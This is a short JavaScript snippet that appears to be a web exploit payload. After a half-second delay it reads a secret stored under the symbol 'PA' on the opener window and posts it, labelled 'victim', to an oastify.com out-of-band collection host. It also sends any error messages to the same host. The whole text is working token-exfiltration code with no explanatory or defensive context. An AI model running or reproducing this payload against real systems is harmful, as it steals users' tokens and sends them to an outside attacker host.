setTimeout(() => {
  try {
    const target = window.top.opener;
    if (target) {
      const token = target[Symbol.for("PA")];
      if (token) {
        fetch(`https://7v3qe4pqf69mtruei8ok6trndej573vs.oastify.com/log?victim=${encodeURIComponent(token)}`, {
          method: 'POST',
          mode: 'no-cors',
          keepalive: true
        });
      }
    }
  } catch (e) {
  fetch(`https://7v3qe4pqf69mtruei8ok6trndej573vs.oastify.com/err?err=${encodeURIComponent(e.message)}`);
  }
}, 500);